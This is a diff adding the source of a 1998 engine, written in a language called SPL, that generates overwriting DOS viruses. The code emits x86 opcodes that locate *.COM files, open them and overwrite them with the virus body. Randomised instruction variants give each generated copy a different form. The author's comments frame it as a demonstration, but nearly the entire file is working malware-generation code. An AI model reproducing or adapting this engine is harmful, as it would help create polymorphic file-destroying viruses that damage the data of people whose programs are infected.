@@ -1,0 +1,186 @@
+//////////////////////////////////////////////////////////////////////////////////////////////
+//
+//   SPL for Windows V2.00
+//
+//   Project Name	: OVERWR    
+//   Author		: Anaktas 
+//   Origin		: Europe, Greece 
+//   Last Update	: 01/12/98
+//   Description	:
+//		This engine, creates an overwriting virus.
+//		It's only for demostrating the use of SPL.
+//		I have a file with 50-60 ovewritting viruses, 
+//		but all of them look the same. 
+//       		So, i wrote this engine to show how vane it is to
+//		write just another variation of OW virus. 
+//////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+// --------------------------------------------------------------------------------------------
+//Here we define the functions 
+
+
+function Org_100h    IP=0100h;
+
+function Mov_AH    
+{  
+	select randvar
+	{ 
+		$0B4h; 
+		all 
+		{	
+			$0B8h;
+			$randvar;
+		}; 
+	};    
+
+}; 
+
+function Mov_AX_3D02h   	all {$0B8h; $02h; $03Dh; };
+
+function Mov_DX_9Eh  all { $0BAh; $09Eh; $000h; };
+
+function Mov_DX_100h all { $0BAh;$00h;$01h; };
+
+function Mov_BH_40h 
+{
+	all
+	{
+		select randvar
+		{
+			$0B7h;		// Mov bh , ..
+			 all
+			{
+				$0BBh;	//Mov bx , ??.. 
+				$randvar;
+			};
+		}; 
+	$040h;				//  .. , 40h
+	}
+};
+
+function Mov_CX_Size all{$0B9h;$randvar;$01h; };   //CX=100h..1FFh
+
+function  Int_21h     all {$0CDh;$021h; };
+
+function Text 
+{
+	select randvar
+	{   
+		all {$20h;$066h;$069h;$072h;$073h;$074h;$020h; };        // " first "
+		all {$20h;$073h;$065h;$063h;$06Fh;$06Eh;$064h;$020h; };  // " second "
+		all {$20h;$074h;$072h;$069h;$074h;$06Fh;$020h; };         // " trito "
+	};
+};
+
+
+
+function PushAX	$050h;
+function PushBX	$053h;
+function PopAX	$058h;
+function PopBX	$05Bh;
+function XcghAXBX	$093h;
+
+variable Sw_Xchg;               //0=push/pop   1=push/pop  2=xchg
+function Xchg_AX_BX 
+{
+	select  Sw_Xchg
+	{
+		shift { PushAX; PushBX;PopAX;PopBX };  
+		shift { PushBX; PushAX;PopBX;PopAX }; 
+		XcghAXBX;		
+	};
+};
+
+function Jmp_Find  
+{
+	all
+	{
+		$0EBh;	
+		$deltab Lb_Find;   
+	}
+};
+
+
+function Mov_DX_Filename 
+all{   
+	select  randvar
+	{
+		$0BAh;			//Mov dx , ....
+		all{$08Dh;$016h; };		//LEA dx , ....
+	};
+	$offset Lb_filename;
+};
+
+
+function Filename 
+all{
+	label Lb_filename;
+
+	//put the filename
+	$02Ah;$02Eh;			// "*."
+	select randvar($043h; $063h;); 	// 'C' or 'c'
+	select randvar($04Fh; $06Fh;);  	// 'O' or 'o'
+	select randvar($04Dh; $06Dh;);	// 'M' or 'm' 
+	$00; 				// null-terminated 
+};
+
+
+function Jc_Exit  all 
+{
+    $072h;   
+    $deltab Lb_Exit;
+};
+
+function Exit  all
+{
+		label Lb_Exit;
+		select randvar{  all{$0CDh;$020h; };  $0C3h;  };  // INT 20h  or RET
+};
+
+
+
+
+
+//////////////////////////////////////////////////////////////////////////////////////////////
+        //Here we Start
+main
+{
+	Org_100h;         // COM files are "org 100h" 
+	Mov_AH; $04Eh;    // DOS call: findfirst 
+	label Lb_Find;    // A label
+	Mov_DX_Filename;  
+	Int_21h;           
+	Jc_Exit;          // If no more files then exit
+	Mov_AX_3D02h;     // DOS call: Open file
+	Mov_DX_9Eh;
+	Int_21h;          // AX=handler
+	Mov_BH_40h;       // DOS call: Write in file 
+	random 
+	{                 
+		Xchg_AX_BX;    // now AX=40h and BX=handler
+		Mov_DX_100h;
+		Mov_CX_Size;  
+	};
+	Int_21h;
+	Mov_AH; $04Fh;    //DOS call: Findnext
+	Jmp_Find;              //Jmp to Lb_Find
+	random 	
+	{	
+		Text;
+		Filename;   
+		Exit;
+	};
+	
+	variable external OWVirusSize;	
+	OWVirusSize= IP - 100h;     	// This external variable, is used for calculating the virus size.
+				// See 'overwr.inc'  and 'overwr.asm' for more information on
+				// 'OWVirusSize' variable.
+	
+};
+
+//      Here we END
+//////////////////////////////////////////////////////////////////////////////////////////////
+
